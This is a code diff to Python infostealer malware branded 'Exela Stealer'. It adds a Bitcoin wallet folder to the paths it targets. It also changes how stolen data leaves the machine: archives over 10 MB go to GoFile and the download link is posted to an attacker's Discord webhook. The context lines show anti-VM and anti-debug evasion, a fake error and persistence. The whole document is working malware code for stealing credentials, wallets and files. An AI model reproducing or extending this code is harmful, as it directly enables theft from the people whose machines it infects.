@@ -389,6 +389,7 @@ class Main:
                 "MetaMask_Edge": "ejbalbakoplchlghecdalmeeeajnimhm",
                 "Tron": "ibnejdfjmmkpcnlpebklmnkoeoihofec",}
             wallet_local_paths = {
+                "Bitcoin": os.path.join(self.RoamingAppData, "Bitcoin", "wallets"),
                 "Zcash": os.path.join(self.RoamingAppData, "Zcash"),
                 "Armory": os.path.join(self.RoamingAppData, "Armory"),
                 "Bytecoin": os.path.join(self.RoamingAppData, "bytecoin"),
@@ -1906,13 +1907,33 @@ class Main:
             async with session.post(webhook, json=payload, headers=headers) as response:
                 pass
             await self.SendContains()
-            with open(filePath + ".zip", 'rb') as file:
-                dosya_verisi = file.read()
-            payload = aiohttp.FormData()
-            payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
-            async with session.post(webhook, data=payload) as f:
-                pass
-            del payload
+            if not os.path.getsize(filePath + ".zip") / (1024 * 1024) > 10:
+                with open(filePath + ".zip", 'rb') as file:
+                    dosya_verisi = file.read()
+                payload = aiohttp.FormData()
+                payload.add_field('file', dosya_verisi, filename=os.path.basename(filePath + ".zip"))
+                async with session.post(webhook, data=payload) as f:
+                    pass
+                del payload
+                
+            else:
+                succes = await UploadGoFile.upload_file(filePath + ".zip")
+                if succes != None:
+                    embed_data2 = {
+                        "title": "***Exela Stealer***",
+                        "description": f"***Exela Stealer Full Info***",
+                        "url" : "https://t.me/ExelaStealer",
+                        "color": 0,
+                        "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                        "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                    fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
+                    embed_data2["fields"] = fields2
+                    payload2 = {
+                        "username": "Exela Stealer",
+                        "embeds": [embed_data2] }
+                    async with session.post(webhook, json=payload2) as req:
+                        pass
+                else:print("file cannot uploaded to GoFile.")
             try:
                 os.remove(filePath + ".zip")
                 shutil.rmtree(filePath)
@@ -1921,14 +1942,69 @@ class Main:
             await self.StealCommonFiles("CommonFiles")
             try:
                 shutil.make_archive(os.path.join(self.Temp, "CommonFiles"), "zip", os.path.join(self.Temp, "CommonFiles"))
-                with open(os.path.join(self.Temp, "CommonFiles") + ".zip", 'rb') as file:
-                    dosya_verisi = file.read()
-                payload = aiohttp.FormData()
-                payload.add_field('file', dosya_verisi, filename=os.path.basename(os.path.join(self.Temp, "CommonFiles") + ".zip"))
-                async with session.post(webhook, data=payload) as f:
-                    pass
+                if not os.path.getsize(os.path.join(self.Temp, "CommonFiles") + ".zip") / (1024 * 1024) > 10:
+                    with open(os.path.join(self.Temp, "CommonFiles") + ".zip", 'rb') as file:
+                        dosya_verisi = file.read()
+                    payload = aiohttp.FormData()
+                    payload.add_field('file', dosya_verisi, filename=os.path.basename(os.path.join(self.Temp, "CommonFiles") + ".zip"))
+                    async with session.post(webhook, data=payload) as f:
+                        pass
+                else:
+                    succes = await UploadGoFile.upload_file(os.path.join(self.Temp, "CommonFiles") + ".zip")
+                    if succes != None:
+                        embed_data2 = {
+                            "title": "***Exela Stealer***",
+                            "description": f"***Exela Stealer Full Info***",
+                            "url" : "https://t.me/ExelaStealer",
+                            "color": 0,
+                            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
+                            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                        fields2 = [{"name": "Download Link", "value": f"[CommonFiles.zip]({succes})", "inline": True}]
+                        embed_data2["fields"] = fields2
+                        payload2 = {
+                            "username": "Exela Stealer",
+                            "embeds": [embed_data2] }
+                        async with session.post(webhook, json=payload2) as req:
+                            pass
+                    else:print("file cannot uploaded to GoFile.")
             except Exception as e:
                 print(e)
+
+
+class UploadGoFile:
+    @staticmethod
+    async def GetServer() -> str:
+        try:
+            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
+                async with session.get("https://api.gofile.io/getServer") as request:
+                    data = await request.json()
+                    return data["data"]["server"]
+        except Exception as e:
+            print(f"An Error occurred while getting server: '{e}'\nit will use default server (store 1).")
+            return "store1"
+    @staticmethod
+    async def upload_file(file_path: str) -> str:
+        try:
+            ActiveServer = await UploadGoFile.GetServer()
+            upload_url = f"https://{ActiveServer}.gofile.io/uploadFile"
+            async with aiohttp.ClientSession() as session:
+                file_form = aiohttp.FormData()
+                file_form.add_field('file', open(file_path, 'rb'), filename=os.path.basename(file_path))
+
+                async with session.post(upload_url, data=file_form) as response:
+                    response_body = await response.text()
+
+                    raw_json = json.loads(response_body)
+                    d = json.dumps(raw_json)
+                    output = json.loads(d)
+
+                    download_page = output['data']['downloadPage']
+                    return download_page
+        except Exception as e:
+            print(f"An error occurred during file upload: '{e}'")
+            return None
+
+
 class Startup:
     def __init__(self) -> None:
         self.LocalAppData = os.getenv("LOCALAPPDATA")
@@ -2230,6 +2306,7 @@ if __name__ == '__main__':
             print("mutex already exist")
             os._exit(0)
         else:
+            start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().Main())
             asyncio.run(AntiDebug().calback())
@@ -2238,5 +2315,6 @@ if __name__ == '__main__':
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.main())
+            print(f"The code executed on: {str(time.time() - start_time)} second")
     else:
         print("just Windows Operating system's supported by Exela")
